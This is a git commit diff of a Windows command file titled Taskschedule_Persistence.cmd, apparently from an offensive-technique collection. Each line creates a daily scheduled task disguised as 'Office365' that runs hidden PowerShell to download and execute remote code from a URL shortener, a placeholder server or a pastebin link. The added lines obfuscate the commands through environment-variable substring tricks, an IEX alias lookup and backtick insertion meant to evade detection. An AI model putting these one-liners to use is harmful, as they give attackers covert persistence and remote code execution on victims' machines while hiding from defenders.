4427073ef8dec52ae2b32b822647e87bd25a31e4
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-26 12:44:31 +0100

    Update Taskschedule_Persistence.cmd

--- Taskschedule_Persistence.cmd
+++ Taskschedule_Persistence.cmd
@@ -2,5 +2,11 @@
 cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"https://cutt.ly/WS8Vek5\\\"))""
 cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w HidDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://server/payload.ps1\\\"))""
 
+
 #Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe 
 cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://server/payload.ps1\\\"))""
+
+
+#Info: %APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l = powershell.exe 
+#INfo: &(GAL IE*) = Alias IEX
+cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "%APPDATA:~-13,1%%ALLUSERSPROFILE:~-9,-8%%OS:~-5,1%er%TMP:~7,1%he%TEMP:~-10,1%l -w HidDEn -nOPr  -co &(GAL IE*)((N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"ht\\\"+\\\"tps://pastebin.com/raw/Qpiz8y6c\\\")))""
